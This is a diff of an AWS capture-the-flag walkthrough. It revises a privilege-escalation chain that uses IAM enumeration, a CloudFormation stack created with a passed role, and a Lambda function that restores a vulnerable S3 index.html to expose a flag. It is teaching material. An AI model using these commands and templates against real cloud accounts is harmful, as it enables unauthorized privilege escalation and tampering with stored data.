@@ -12,11 +12,9 @@ $ aws configure --profile {IAM User}
 
 ```sh
 $ aws sts get-caller-identity --profile {IAM User}
-$ aws iam get-user --user-name {} --profile {IAM User}
-	-> PermissionBoundary Discovery.
 $ aws iam list-user-policies --user-name {} --profile {IAM User}
 $ aws iam get-user-policy --user-name {} --policy-name {} --profile {IAM User}
-	-> Check S3 query permissions, CloudFormation stack creation permissions, CreateRole, etc.
+	-> Check S3 permissions, CloudFormation:CreateStack, lambda:InvokeFunction, and passrolls to roles.
 ```
 
 4. S3 object, check version and then try to download.
@@ -37,59 +35,58 @@ $ aws s3api get-object \
   --profile {IAM User}
 ```
 
-5. After failing to download only Flag.txt with bucket policy, check the contents of previous version `index.html`.
+5. Check the contents of previous version `index.html`.
 
 ```
 $ cat {index.html}
-    -> Check the previous version of index.html logic and see if it needs to be restored.
+    -> Reviewed the code that attempts to read flag.txt from another bucket. It is clear that the corresponding HTML needs to be restored.
+    -->The flag.txt object cannot be accessed directly.
 ```
 
-6. Check permissions to use Cloudformation after restore fails due to lack of putobject permission required to restore previous version.
+6. Check permissions to use Cloudformation after restore fails due to lack of putobject permission required to restore previous version. Also get information about Role that allows passrole.
 
 ```sh
-$ aws iam get-policy --policy-arn {Boundary ARN} --profile {IAM User}
+$ aws iam list-roles --profile {IAM User}
+  -> Check the CloudFormation, Lambda Role.
 
-  -> In order to create a CreateRole in a Cloudformation policy, you must create a template by inserting a boundary policy.
-```
-```sh
-$ aws iam get-policy-version \
-  --policy-arn {Boundary ARN} \
-  --version-id {Version Id} \
-  --profile {IAM User}
+$ aws iam list-role-policies --role-name {Role name} --profile {IAM User}
 
-  -> Boundary policy has PutObject permission allow check. PutObject permission can be granted with   CreateRole.
+$ aws iam get-role-policy --role-name {} --policy-name {} --profile {IAM User}
+  -> Check the roles trust policy and permission policy.
 ```
 
-7. create a Cloudformation template yaml file. (with RoleName matching the resource in the cloudformation inline policy)
+7. Create a CloudFormation template (YAML) to define and deploy a Lambda function, ensuring the appropriate trust relationships (assume role) and permissions (pass role) are correctly configured for each related service.
 
 ```yaml
 AWSTemplateFormatVersion: '2010-09-09'
+Description: Upload index.html to S3 using Lambda (executed by CloudFormation)
+
 Resources:
-  ExploitRole:
-    Type: AWS::IAM::Role
+  UploadIndexFunction:
+    Type: AWS::Lambda::Function
     Properties:
-      RoleName: CloudFormationRole 
-      AssumeRolePolicyDocument:
-        Version: '2012-10-17'
-        Statement:
-          - Effect: Allow
-            Principal:
-              AWS: "arn:aws:iam::{identity}:user/{IAM user}"
-            Action: sts:AssumeRole
-            
-      PermissionsBoundary: "arn:aws:iam::{identity}:policy/{Boundary Policy}"
-           
-      Policies:
-        - PolicyName: {Desired policy name}
-          PolicyDocument:
-            Version: '2012-10-17'
-            Statement:
-              - Effect: Allow
-                Action:
-                  - s3:PutObject
-                Resource: "*"
+      FunctionName: UploadIndexFile
+      Runtime: python3.12
+      Handler: index.lambda_handler
+      Role: arn:aws:iam::{}:role/{LambdaPutRole}
+      Code:
+        ZipFile: |
+          import boto3
+
+          def lambda_handler(event, context):
+              s3 = boto3.client("s3")
+              content = """
+              {index.html Copy and paste vulnerable version code}
+              """
+              s3.put_object(
+                  Bucket="{Index Bucket}",
+                  Key="index.html",
+                  Body=content,
+                  ContentType="text/html"
+              )
+              return {"status": "uploaded"}
 ```
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The RoleName of the policy must match and the PermissionsBoundary entry must be included. Additionally, even if you grant higher permissions due to the permission boundary, only putobject will work.
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -> Specify the desired function name and attach the privileged Roll  arn. Add the vulnerable version of HTML code that you previously downloaded and write the code to upload to that bucket.
 
 8. Create CloudFormation Stack.
 
@@ -97,43 +94,24 @@ Resources:
 $ aws cloudformation create-stack \
   --stack-name {} \
   --template-body file://{yaml file path} \
-  --capabilities CAPABILITY_NAMED_IAM \
+  --role-arn {CF Role ARN} \
   --profile {IAM User}
 ```
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ->Since users can only create CloudFormation stacks, they create the stack by attaching the CloudFormation role using the --role-arn option. Lambda Create can only perform CloudFormation, so you must use that privilege to define the Lambda function in the template.
 
-9. Role Assume.
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The Lambda function in the template is assigned a role that allows it to assume the PutObject permission. As a result, when the stack is created, a Lambda function is created to run and upload objects to the specified S3 bucket.
 
-```sh
-$ aws iam list-roles --profile {IAM User} 
-	-> Check the Role arn generated by cloudformation.
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The Lambda function contains a vulnerable version of index.html that was previously downloaded through GetObject. Once the function is executed, this vulnerable index.html file is uploaded to the bucket. This causes the vulnerable version of the website to be re-hosted via S3 static website hosting.
 
-$ aws sts assume-role \
-  --role-arn arn:aws:iam::{}:role/{} \
-  --role-session-name {} \
-  --profile {IAM User}
-```
-
-10. Configure Assume user temporary credentials. (~/.aws/credentials)
+9. To create a stack and run the created Lambda function, run the function with IAM Lambda Invoke permission.
 
 ```sh
-[Assume]
-aws_access_key_id = <AssumedAccessKeyId>
-aws_secret_access_key = <AssumedSecretAccessKey>
-aws_session_token = <SessionToken>
+$ aws lambda invoke \
+	--function-name {FunctionName} \
+  ./output.json --profile {IAM User}
 ```
 
-11. Restore a previous version.
-
-```sh
-$ aws s3api put-object \
-  --bucket {} \
-  --key index.html \
-  --body ./{} \ 
-  --content-type text/html \
-  --profile {Assume}
-```
-
-12. After reconnecting to the web, restore and check the flag.
+10. After reconnecting to the web, restore and check the flag.
 
 ```
 http://{}.s3-website-<region>.amazonaws.com/
@@ -141,10 +119,11 @@ http://{}.s3-website-<region>.amazonaws.com/
 
 ## Conclusion
 
-In this scenario, we:
-1. **Identifying the vulnerability of the object lock + versioning combination.**
-    ->Object locking works for single objects, but it doesn't work when combined with versioning. S3 versioning is the concept of stacking objects rather than overwriting them when PutObject is used.
-2. **AWS Privilege Escalation** (privilege escalation) by creating a Cloudformation stack
-    → Escalate privileges by linking explicitly denied permissions to permission boundaries.
+In this scenario, we are:
+1. **Identify vulnerabilities in object lock + version combination.**.
+- Object locking works on a single object, but not when combined with version management. S3 version management is the concept of stacking objects instead of overwriting them when using PutObject.
+2. **AWS privilege escalation** (Create Lambda Function).
+- Escalate authority by creating CloudFormation stacks.
+→ Link IAM Role to Cloud information's vulnerable privileges.
 
-This walkthrough demonstrates a cloud security vulnerability involving S3 and permission boundaries, and shows how to create a role using a CloudFormation stack.
+This walkthrough shows cloud security vulnerabilities related to the setup of S3 and shows how to use the CloudFormation stack to generate Lambda functions.
